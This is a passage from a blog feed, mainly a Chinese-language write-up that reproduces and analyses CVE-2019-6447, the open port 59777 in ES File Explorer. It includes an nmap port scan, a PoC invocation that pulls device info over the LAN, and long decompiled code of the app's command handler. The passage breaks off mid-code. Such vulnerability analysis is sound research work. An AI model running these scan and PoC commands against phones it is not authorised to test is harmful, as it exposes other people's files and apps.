&#125;%&gt;</span><br></pre></td></tr></table></figure><p>然后重新生成网页[hexo g]就可以了</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-6447复现与分析</title>
      <link href="/p/1248545765.html"/>
      <url>/p/1248545765.html</url>
      
        <content type="html"><![CDATA[<p>简单分析下CVE-2019-6447</p><span id="more"></span><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>ES File Explorer File Manager application for Android（ES文件浏览器或文件管理器）是一款基于Android系统的多功能手机文件、程序和进程管理器，它支持在手机、电脑、远程和蓝牙间浏览管理文件。 基于Android平台的ES File Explorer File Manager application 4.1.9.7.4及之前版本中存在安全漏洞，该漏洞源于ES应用程序在运行一次之后（CVE-2019-6447），该端口并未关闭依旧可以通过HTTP协议接收JSON数据。攻击者可通过向TCP 59777端口发送请求利用该漏洞读取任意文件或执行应用程序。</p><h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>Github地址：<a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>安装ES文件管理器，版本低于4.1.9.7.4并启动，不执行任何操作<br><img src="/images/kE3atnM.jpg"></p></li><li><p>接入与电脑同一局域网<br><img src="/images/c245pIe.png"></p></li><li><p>对指定设备进行扫描<br><code>nmap -sS -p 1-65535 -v 192.168.2.63</code><br><img src="/images/IGl4o0B.png"></p></li><li><p>验证POC<br>执行命令<code>python3 poc.py --cmd getDeviceInfo --network 192.168.2.</code><br><img src="/images/xCyyXjU.png"></p></li></ol><p>回显设备信息和FTP端口号<br>复现成功</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从一些渠道下载到了低于官网的软件安装包，然后解包后将3个classes.dex转为jar<br>最终目录图如下<br><img src="/images/8P1fu00.png"></p><p>用JD-GUI打开JAR包<br><img src="/images/iTJfqEf.png"></p><p>对POC中的关键字如<code>59777</code>、<code>command</code>等进行全局搜索，最终取得执行漏洞的关键代码和，具体如下</p><h1 id="漏洞包关键代码"><a href="#漏洞包关键代码" class="headerlink" title="漏洞包关键代码"></a>漏洞包关键代码</h1><h2 id="开启服务器相关代码"><a href="#开启服务器相关代码" class="headerlink" title="开启服务器相关代码"></a>开启服务器相关代码</h2><h2 id="com-estrongs-android-f-a"><a href="#com-estrongs-android-f-a" class="headerlink" title="com.estrongs.android.f.a"></a><code>com.estrongs.android.f.a</code></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">(<span class="type">boolean</span> paramBoolean)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">bool1</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (g)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((f != <span class="literal">null</span>) &amp;&amp; (f.d())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">a</span> <span class="variable">locala</span> <span class="operator">=</span> f;</span><br><span class="line">      <span class="keyword">if</span> (locala == <span class="literal">null</span>) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.i();</span><br><span class="line">      f = <span class="literal">null</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (;;)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="keyword">try</span></span><br><span class="line">          &#123;</span><br><span class="line">            f = <span class="keyword">new</span> <span class="title class_">a</span>(<span class="string">&quot;/sdcard&quot;</span>, <span class="number">59777</span> + i, paramBoolean);</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="type">boolean</span> <span class="variable">bool2</span> <span class="operator">=</span> f.d();</span><br><span class="line">              <span class="keyword">if</span> (bool2)</span><br><span class="line">              &#123;</span><br><span class="line">                paramBoolean = bool1;</span><br><span class="line">                <span class="keyword">return</span> paramBoolean;</span><br><span class="line">                localObject2 = <span class="keyword">finally</span>;</span><br><span class="line">                <span class="keyword">throw</span> localObject2;</span><br><span class="line">              &#125;</span><br><span class="line">              Thread.sleep(<span class="number">200L</span>);</span><br><span class="line">              j -= <span class="number">200</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Exception localException1)</span><br><span class="line">          &#123;</span><br><span class="line">            f = <span class="literal">null</span>;</span><br><span class="line">            localException1.printStackTrace();</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception localException2)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (;;)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        paramBoolean = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中a继承自c。</p><h1 id="com-estrongs-android-f-c"><a href="#com-estrongs-android-f-c" class="headerlink" title="com.estrongs.android.f.c"></a><code>com.estrongs.android.f.c</code></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">c</span><span class="params">(<span class="type">int</span> paramInt)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">this</span>.b = paramInt;</span><br><span class="line">  <span class="built_in">this</span>.l = <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="built_in">this</span>.b);</span><br><span class="line">  <span class="built_in">this</span>.c = <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> (!c.a(c.<span class="built_in">this</span>)) &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">c</span>.a(c.<span class="built_in">this</span>, c.b(c.<span class="built_in">this</span>).accept());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (IOException localIOException) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">this</span>.c.setDaemon(<span class="literal">true</span>);</span><br><span class="line">  <span class="built_in">this</span>.c.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="com-estrongs-android-f-a-1"><a href="#com-estrongs-android-f-a-1" class="headerlink" title="com.estrongs.android.f.a"></a><code>com.estrongs.android.f.a</code></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.b <span class="title function_">a</span><span class="params">(String paramString1, String paramString2, Properties paramProperties1, Properties paramProperties2, Properties paramProperties3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (paramString1.startsWith(<span class="string">&quot;/estrongs_filemgr_oauth_result&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString1 = CreateOAuthNetDisk.b();</span><br><span class="line">    <span class="keyword">if</span> (paramString1 != <span class="literal">null</span>) &#123;</span><br><span class="line">      paramString1.a(paramProperties2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (paramString2.equals(<span class="string">&quot;POST&quot;</span>))<span class="comment">//判断发送方法是否为POST</span></span><br><span class="line">  &#123;</span><br><span class="line">    localObject = <span class="keyword">new</span> <span class="title class_">String</span>(g());</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      localObject = <span class="keyword">new</span> <span class="title class_">JSONObject</span>((String)localObject);<span class="comment">//JSONG解码</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> ((JSONObject)localObject).getString(<span class="string">&quot;command&quot;</span>);<span class="comment">//获取JSON中command字段值</span></span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listFiles&quot;</span>)) &#123;<span class="comment">//获取文件列表</span></span><br><span class="line">        <span class="keyword">return</span> b(paramString1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listPics&quot;</span>)) &#123;<span class="comment">//获取图片列表</span></span><br><span class="line">        <span class="keyword">return</span> d();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listVideos&quot;</span>)) &#123;<span class="comment">//获取视频列表</span></span><br><span class="line">        <span class="keyword">return</span> e();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listAudios&quot;</span>)) &#123;<span class="comment">//获取音频列表</span></span><br><span class="line">        <span class="keyword">return</span> f();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listApps&quot;</span>)) &#123;<span class="comment">//获取软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listAppsSystem&quot;</span>)) &#123;<span class="comment">//获取系统软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listAppsPhone&quot;</span>)) &#123;<span class="comment">//获取电话软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listAppsSdcard&quot;</span>)) &#123;<span class="comment">//获取安装在SD卡中的软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">3</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;listAppsAll&quot;</span>)) &#123;<span class="comment">//获取全部APP</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;getAppThumbnail&quot;</span>)) &#123;<span class="comment">//获取APP缩略图</span></span><br><span class="line">        <span class="keyword">return</span> d((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;appLaunch&quot;</span>)) &#123;<span class="comment">//启动APP</span></span><br><span class="line">        <span class="keyword">return</span> a((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;appPull&quot;</span>)) &#123;<span class="comment">//下载APP</span></span><br><span class="line">        <span class="keyword">return</span> c((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">&quot;getDeviceInfo&quot;</span>))<span class="comment">//获取设备信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        paramString1 = b((JSONObject)localObject);</span><br><span class="line">        <span class="keyword">return</span> paramString1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (JSONException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      paramString1.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, paramString1.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">localObject</span> <span class="operator">=</span> ah.bL(paramString1);</span><br><span class="line">  <span class="keyword">if</span> ((localObject == <span class="literal">null</span>) || (ah.I((String)localObject) == <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (localObject == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>.a(paramString1, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.a((String)localObject, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">  &#125;</span><br><span class="line">  paramString1 = paramProperties1.getProperty(<span class="string">&quot;range&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((paramString1 != <span class="literal">null</span>) &amp;&amp; (paramString1.startsWith(<span class="string">&quot;bytes=&quot;</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString2 = paramString1.substring(<span class="string">&quot;bytes=&quot;</span>.length());</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> paramString2.indexOf(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">    paramString1 = paramString2;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      paramString1 = paramString2.substring(<span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      l = Long.parseLong(paramString1);</span><br><span class="line">      <span class="keyword">return</span> a((String)localObject, l, <span class="number">0L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NumberFormatException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      l = <span class="number">0L</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于漏洞应用条件是在同一个局域网下，所以应用在获取完传入的方法【指令】后调用<code>com.estrongs.android.util.af</code>中的bM方法验证URI地址</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bM</span><span class="params">(String paramString)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (paramString == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> ad.a();</span><br><span class="line">    <span class="type">int</span> i2;</span><br><span class="line">    <span class="keyword">if</span> ((paramString.startsWith(<span class="string">&quot;http://127.0.0.1&quot;</span>)) || (paramString.startsWith(<span class="string">&quot;http://&quot;</span> + str1)))</span><br><span class="line">    &#123;</span><br><span class="line">      i1 = paramString.indexOf(<span class="string">&quot;/&quot;</span>, <span class="number">7</span>);</span><br><span class="line">      str1 = paramString;</span><br><span class="line">      <span class="keyword">if</span> (i1 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        str1 = paramString.substring(i1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!str1.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">break</span> label116;</span><br><span class="line">      &#125;</span><br><span class="line">      i2 = str1.indexOf(<span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>并且同时调用<code>comestrongsandroidutilad</code>中的a方法检测当前环境是否处于WIFI环境下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ad</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">a</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">localObject</span> <span class="operator">=</span> FexApplication.a();</span><br><span class="line">    <span class="keyword">if</span> (b())</span><br><span class="line">    &#123;</span><br><span class="line">      localObject = ((WifiManager)((Context)localObject).getSystemService(<span class="string">&quot;wifi&quot;</span>)).getConnectionInfo();</span><br><span class="line">      <span class="keyword">if</span> ((localObject == <span class="literal">null</span>) || (((WifiInfo)localObject).getIpAddress() == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> o.a();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ((WifiInfo)localObject).getIpAddress();</span><br><span class="line">      <span class="keyword">return</span> (i &amp; <span class="number">0xFF</span>) + <span class="string">&quot;.&quot;</span> + (i &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>) + <span class="string">&quot;.&quot;</span> + (i &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>) + <span class="string">&quot;.&quot;</span> + (i &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o.a();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当传入的<code>command</code>为<code>listFiles</code>时，会调用b()函数获取文件信息并以Json格式返回，相关代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.b <span class="title function_">b</span><span class="params">(String paramString)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ah.I(paramString) == <span class="number">0</span>) &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">localObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(paramString).listFiles();</span><br><span class="line">      <span class="type">DateFormat</span> <span class="variable">localDateFormat</span> <span class="operator">=</span> com.estrongs.android.pop.h.a().K();</span><br><span class="line">      <span class="type">SimpleDateFormat</span> <span class="variable">localSimpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot; hh:mm:ss a&quot;</span>);</span><br><span class="line">      paramString = <span class="string">&quot;[\r\n&quot;</span>;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; localObject.length)</span><br><span class="line">      &#123;</span><br><span class="line">        paramString = paramString + <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">        paramString = paramString + <span class="string">&quot;\&quot;name\&quot;:\&quot;&quot;</span> + localObject.getName() + <span class="string">&quot;\&quot;, &quot;</span>;<span class="comment">//文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> paramString + <span class="string">&quot;\&quot;time\&quot;:\&quot;&quot;</span> + localDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>(localObject.lastModified())) + localSimpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>(localObject.lastModified())) + <span class="string">&quot;\&quot;, &quot;</span>;<span class="comment">//时间</span></span><br><span class="line">        <span class="keyword">if</span> (!localObject.isDirectory()) &#123;</span><br><span class="line">          <span class="keyword">break</span> label437;</span><br><span class="line">        &#125;</span><br><span class="line">        paramString = <span class="string">&quot;folder&quot;</span>;</span><br><span class="line">        paramString = str + <span class="string">&quot;\&quot;type\&quot;:\&quot;&quot;</span> + paramString + <span class="string">&quot;\&quot;, &quot;</span>;<span class="comment">//文件类型</span></span><br><span class="line">        paramString = paramString + <span class="string">&quot;\&quot;size\&quot;:\&quot;&quot;</span> + a(localObject.length()) + <span class="string">&quot;\&quot;, &quot;</span>;<span class="comment">//大小</span></span><br><span class="line">        <span class="keyword">if</span> (i == localObject.length - <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          paramString = paramString + <span class="string">&quot;&#125;\r\n&quot;</span>;</span><br><span class="line">          <span class="keyword">break</span> label430;</span><br><span class="line">        &#125;</span><br><span class="line">        paramString = paramString + <span class="string">&quot;&#125;, \r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span> label430;</span><br><span class="line">      &#125;</span><br><span class="line">      paramString = paramString + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">      localObject = <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;200 OK&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, a(paramString));</span><br><span class="line">      ((c.b)localObject).a(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + paramString.getBytes(<span class="string">&quot;utf-8&quot;</span>).length);</span><br><span class="line">      <span class="keyword">return</span> localObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception paramString)<span class="comment">//错误处理</span></span><br><span class="line">    &#123;</span><br><span class="line">      paramString.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, paramString.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;400 Bad Request&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;Not Supported&quot;</span>);</span><br><span class="line">    label430:</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    label437:</span><br><span class="line">    paramString = <span class="string">&quot;file&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当获取的<code>command</code>为<code>appLaunch</code>时，会调用a()方法执行APP，运行成功会返回HTTP CODE 200，不存在则返回500并返回<code>not found the package </code>信息</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.b <span class="title function_">a</span><span class="params">(JSONObject paramJSONObject)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        paramJSONObject = paramJSONObject.getString(<span class="string">&quot;appPackageName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (paramJSONObject != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">          paramJSONObject = FexApplication.c().getPackageManager().getLaunchIntentForPackage(paramJSONObject);</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (paramJSONObject != <span class="literal">null</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            FexApplication.c().startActivity(paramJSONObject);</span><br><span class="line">            paramJSONObject = <span class="string">&quot;&#123;&quot;</span> + <span class="string">&quot;\&quot;result\&quot;:\&quot;&quot;</span> + i + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">            paramJSONObject = paramJSONObject + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            c.<span class="type">b</span> <span class="variable">localb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;200 OK&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, a(paramJSONObject));</span><br><span class="line">            localb.a(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + paramJSONObject.getBytes(<span class="string">&quot;utf-8&quot;</span>).length);</span><br><span class="line">            <span class="keyword">return</span> localb;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          paramJSONObject = <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;not found the package &quot;</span> + paramJSONObject);</span><br><span class="line">          <span class="keyword">return</span> paramJSONObject;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception paramJSONObject)</span><br><span class="line">      &#123;</span><br><span class="line">        paramJSONObject.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, paramJSONObject.toString());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当获取到的<code>command</code>为<code>appPull</code>时，会调用C方法下载一个指定文件，如果存在则返回200并且以数据流传输回设备中，否则返回500并回显<code>not found the package</code>，代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.b <span class="title function_">c</span><span class="params">(JSONObject paramJSONObject)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">localObject</span> <span class="operator">=</span> paramJSONObject.getString(<span class="string">&quot;appPackageName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (localObject != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paramJSONObject = <span class="keyword">new</span> <span class="title class_">File</span>(FexApplication.c().getPackageManager().getApplicationInfo((String)localObject, <span class="number">0</span>).sourceDir);</span><br><span class="line">      <span class="keyword">if</span> (paramJSONObject.exists())</span><br><span class="line">      &#123;</span><br><span class="line">        localObject = <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;200 OK&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>, <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(paramJSONObject));</span><br><span class="line">        ((c.b)localObject).a(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;&quot;</span> + paramJSONObject.length());</span><br><span class="line">        <span class="keyword">return</span> localObject;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    paramJSONObject = <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, <span class="string">&quot;not found the package &quot;</span> + (String)localObject);</span><br><span class="line">    <span class="keyword">return</span> paramJSONObject;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Exception paramJSONObject)</span><br><span class="line">  &#123;</span><br><span class="line">    paramJSONObject.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">c</span>.b(<span class="built_in">this</span>, <span class="string">&quot;500 Internal Server Error&quot;</span>, <span class="string">&quot;text/plain&quot;</span>, paramJSONObject.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当传入的<code>command</code>为<code>listApps</code>、<code>listAppsSystem</code>、<code>listAppsPhone</code>、<code>listAppsSdcard</code>、<code>listAppsAll</code>时，会调用a(int paramInt)方法执行相应功能，a方法代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.b <span class="title function_">a</span><span class="params">(<span class="type">int</span> paramInt)</span></span><br><span class="line">  &#123;</span><br><span class="line">    Object localObject2;</span><br><span class="line">    PackageInfo localPackageInfo;</span><br><span class="line">    Object localObject3;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">localObject1</span> <span class="operator">=</span> FexApplication.a().b(<span class="number">8192</span>);</span><br><span class="line">        localObject2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        localObject1 = ((List)localObject1).iterator();</span><br><span class="line">        <span 